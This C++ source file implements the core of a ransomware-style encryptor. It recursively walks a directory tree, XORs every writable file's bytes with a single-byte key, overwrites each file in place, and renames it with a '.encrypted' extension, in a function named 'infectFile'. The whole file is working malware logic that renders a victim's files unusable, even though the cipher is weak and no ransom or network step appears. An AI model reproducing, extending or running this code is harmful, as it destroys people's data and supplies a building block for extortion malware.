#include "Crypt.h"

Crypt::Crypt() {}

VOID Crypt::startCrypt() {
	traverseDirectory(this->startingPath);
}

VOID Crypt::infectFile(const fs::directory_entry& file) {
	XORCryptFile(file);
	changeExtension(file);
}

VOID Crypt::traverseDirectory(const std::wstring& folderPath) {
	for (const auto& dirEntry : fs::recursive_directory_iterator(folderPath)) {
		if (dirEntry.is_regular_file()) {
			fs::file_status status = dirEntry.status();

			if ((status.permissions() & fs::perms::owner_write) != fs::perms::none) {
				//std::cout << dirEntry << std::endl;
				infectFile(dirEntry);
			}
		}
	}
}

VOID Crypt::XORCryptFile(const fs::directory_entry& file) {
	std::vector<char> encrypted_content = encryptBytes(file);
	std::ofstream output(file.path().string(), std::ios::binary);

	if (!output.is_open()) {
		return;
	}

	output.write(&encrypted_content[0], encrypted_content.size());

	output.close();

	return;
}

VOID Crypt::changeExtension(const fs::directory_entry& file) {
	fs::path filePath		= file.path();
	fs::path newFilePath	= filePath;
	newFilePath.replace_extension(".encrypted");

	std::error_code ec;
	fs::rename(filePath, newFilePath, ec);

	return;
}

std::vector<char> Crypt::encryptBytes(const fs::directory_entry& file) {
	std::ifstream entry(file.path().string(), std::ios::binary);

	if (!entry.is_open()) {
		return {};
	}

	std::vector<char> bytes(std::istreambuf_iterator<char>(entry), {});

	for (size_t i = 0; i < bytes.size(); ++i) {
		//std::cout << bytes[i];
		bytes[i] ^= this->key;
	}

	entry.close();

	return bytes;
}